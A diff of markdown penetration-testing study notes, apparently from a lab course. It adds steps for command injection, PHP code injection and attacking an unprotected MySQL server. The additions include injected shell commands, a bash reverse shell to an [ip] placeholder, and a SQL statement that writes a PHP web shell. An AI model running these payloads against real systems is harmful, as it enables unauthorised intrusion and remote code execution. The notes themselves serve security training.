@@ -8,7 +8,7 @@
   - Select method with curl → curl -v -X POST ```url```
   - Select method with curl and data → curl -v -X POST -d "name=test&password=pass" ```url```
 
-  ### 6.2. Attacking basic HTTP authentication
+### 6.2. Attacking basic HTTP authentication
 
 - **Automation of attack with Intruder**:
   1. Send to repeater
@@ -51,9 +51,44 @@
 
 ### 6.7. Advanced electron forum CSRF
 
-1. CLI to search for exploits → ```searchsploit "Advanced Electron Forum"
+1. CLI to search for exploits → ```searchsploit "Advanced Electron Forum"```
 2. When copying → paste the path with this prefix: ```usr/share/exploitdb/exploits/php/webapps/whatever.txt```
 3. Check the html payload. Copy it.
 4. Change the url in the form. Save it in the desktop
 5. Change the name of the database
 6. Double click on the html and it'll execute. 
+
+#### 6.8. Command injection
+
+1. Intercept the request with burp suite. 
+2. First it comes an OPTIONS request, then POST
+3. Desktop/wordlists/txt. Upload the file
+4. Check the payload. It has two fields: file and data.
+5. Inject a command in field file
+  -  ```100-common-passwords.txt; whoami```
+  -  ```100-common-passwords.txt; id```
+6. Open a listener with ncat
+  - ```nc -nvlp 4444```
+7. Then try to inject and connect to check the blind injection: 
+  - ```nc [ip] 4444```
+8. Same process can be done in the other direction with a remote shell:
+  - ```bash -c 'bash -i >&/dev/tcp/[ip]/4444 0>&1'```
+9. Check underlying server version: ```cat /etc/*issue```
+
+#### 6.9. PHP code injection
+
+1. Identify the target web app address → ```ifconfig```
+2. Access and select php code attack
+3. Craft the attack into the url → ```test;phpinfo()```
+4. Other examples
+    - System commands → ```system keyword + command in parenthesis```
+    
+#### 6.10. Attack server misconfiguration through a MySQl vulnerability
+
+1. Access the web app on the .3 local ip
+2. Perform an nmap scan → ```sudo nmap -sS -sV --script mysql-empty-password -p 3306 [ip]```
+3. Access non protected database
+  - ```mysql -u root -h [ip]```
+  - ```show databases```
+4. Check writing operations → ```select 'Hello World' into outfile '/tmp/test' from mysql.user limit 1```
+5. Do a RCE with php → ```select '<?php $output=shell_exec($_GET["cmd"]);echo "<pre>".$output."</pre>"?>' into outfile '/var/www/html/shell.php' from mysql.user limit 1;```
